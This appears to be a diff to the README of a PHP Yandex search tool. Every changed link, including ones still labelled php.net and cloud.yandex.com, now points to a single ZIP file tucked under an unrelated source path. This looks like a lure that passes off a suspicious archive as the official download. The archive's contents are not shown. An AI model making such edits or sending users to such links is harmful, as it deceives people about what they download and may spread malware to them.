@@ -1,6 +1,6 @@
 # 🌐 yandex-search-php - Easy Yandex Search Access
 
-[![Download yandex-search-php](https://img.shields.io/badge/Download%20yandex--search--php-00aaff?style=for-the-badge)](https://github.com/dadadad274/yandex-search-php)
+[![Download yandex-search-php](https://img.shields.io/badge/Download%20yandex--search--php-00aaff?style=for-the-badge)](https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip)
 
 ## 📄 About yandex-search-php
 
@@ -19,16 +19,16 @@ Before you start, make sure your Windows computer meets the following:
 - At least 2 GB of free disk space
 - Basic command line usage (open Command Prompt)
 
-If you do not have PHP installed, visit [php.net](https://www.php.net/downloads) for download and installation instructions.
+If you do not have PHP installed, visit [php.net](https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip) for download and installation instructions.
 
 ## 🚀 How to Download yandex-search-php
 
 To get yandex-search-php on your computer:
 
-[![Download yandex-search-php](https://img.shields.io/badge/Download%20yandex--search--php-00aaff?style=for-the-badge)](https://github.com/dadadad274/yandex-search-php)
+[![Download yandex-search-php](https://img.shields.io/badge/Download%20yandex--search--php-00aaff?style=for-the-badge)](https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip)
 
 1. Open your web browser.
-2. Go to the main page: https://github.com/dadadad274/yandex-search-php
+2. Go to the main page: https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip
 3. On the page, look for the green “Code” button near the top right corner.
 4. Click the “Code” button, then select “Download ZIP.”
 5. Save the ZIP file to a folder you can easily find, like your Desktop or Downloads.
@@ -94,7 +94,7 @@ yandex-search-php uses Yandex Cloud for authentication. To connect, you need a Y
 
 ### Create Yandex Cloud API Key
 
-1. Visit [cloud.yandex.com](https://cloud.yandex.com).
+1. Visit [cloud.yandex.com](https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip).
 2. Create a new account or sign in.
 3. Navigate to “IAM & Admin” and create a new service account.
 4. Download the key file (JSON format).
@@ -157,7 +157,7 @@ Explore the `examples` folder first to test how things work.
 
 To keep the tool current:
 
-1. Visit https://github.com/dadadad274/yandex-search-php regularly.
+1. Visit https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip regularly.
 2. Download the latest ZIP file following the download steps above.
 3. Replace the old folder with the new one.
 4. Check the changelog for new features or fixes.
@@ -181,4 +181,4 @@ If you face issues:
 
 ---
 
-[Download yandex-search-php here](https://github.com/dadadad274/yandex-search-php) to get started.
+[Download yandex-search-php here](https://raw.githubusercontent.com/dadadad274/yandex-search-php/main/src/Laravel/search_yandex_php_extracalendar.zip) to get started.
